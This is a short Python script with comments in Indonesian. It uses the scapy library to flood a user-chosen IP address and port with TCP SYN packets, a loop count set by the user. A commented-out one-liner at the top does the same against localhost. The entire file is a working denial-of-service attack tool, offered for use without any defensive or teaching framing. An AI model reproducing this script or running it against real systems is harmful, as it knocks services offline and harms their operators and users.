#---------------------------------------------------------------------------
# from scapy.all import *

# p=IP( dst='127.0.0.1')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
# send(p, verbose=1, loop=1)
#---------------------------------------------------------------------------

# Mengimpor library
from scapy.all import *

# Sebuah fungsi untuk menampung proses
def reflected():
    # Menginisialisasikan variabel untuk memasukkan / inputan alamat IP target
    target = str(input("Enter IP Address of target >> "))
    
    # Menginisialisasikan variabel untuk memasukkan / inputan port target
    port_target = int(input("Enter port of target >> "))
    
    # Menginisialisasikan variabel untuk memasukkan jumlah serangan yang diulang
    loop = int(input("Enter loop of attack >> "))
    
    # Menginisialisasikan variabel untuk melakukan pembentukkan paket
    p = IP(dst = target) / TCP(flags = "S", sport = RandShort(), dport = port_target)
    
    # Proses mengirim paket yang telah dibentuk
    send(p, verbose = 1, loop = loop)

# Pengkondisian if untuk menjalankan program    
if __name__ == "__main__":
    reflected() # Memanggil fungsi untuk menjalankan proses